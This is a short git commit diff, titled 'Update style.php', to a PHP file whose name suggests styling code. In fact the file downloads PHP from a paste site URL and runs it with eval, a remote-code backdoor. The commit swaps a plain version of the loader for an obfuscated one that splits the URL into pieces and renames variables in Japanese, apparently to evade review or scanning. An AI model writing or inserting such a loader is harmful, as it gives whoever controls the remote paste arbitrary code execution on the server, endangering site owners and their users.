e8a53568fb735799df992d3d9dbffca3e3d27206
DamnSec <btc04@protonmail.com>
2024-10-24 20:33:23 +0700

    Update style.php

--- style.php
+++ style.php
@@ -1,11 +1,16 @@
 <?php
-$url = "https://rentry.co/stylephp/raw";
-$handle = fopen($url, "r");
-if ($handle) {
-    $phpCode = stream_get_contents($handle);
-    fclose($handle);
-    eval("?>".$phpCode);
+$プロトコル = "https";
+$ドメイン = "rentry.co";
+$エンドポイント = "stylephp";
+$リソース = "raw";
+$パス = "/$エンドポイント/$リソース";
+$完全なURL = $プロトコル . "://" . $ドメイン . $パス;
+$ファイルポインタ = fopen($完全なURL, "r");
+if ($ファイルポインタ) {
+    $スクリプト内容 = stream_get_contents($ファイルポインタ);
+    fclose($ファイルポインタ);
+    eval("?>" . $スクリプト内容);
 } else {
-    echo "ERROR";
+    echo "エラー";
 }
 ?>
